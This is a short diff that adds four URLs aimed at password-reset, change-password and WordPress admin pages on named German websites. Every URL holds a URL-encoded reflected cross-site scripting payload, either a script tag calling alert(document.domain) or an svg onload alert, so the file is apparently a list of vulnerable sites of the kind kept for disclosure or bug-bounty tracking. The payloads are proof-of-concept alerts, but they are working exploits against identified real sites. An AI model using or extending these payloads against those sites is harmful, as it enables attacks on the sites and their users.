@@ -1,0 +1,4 @@
+http://extraflex.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://fahrraddirektverkauf.de/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+http://fair-risk.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+http://falken4you.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
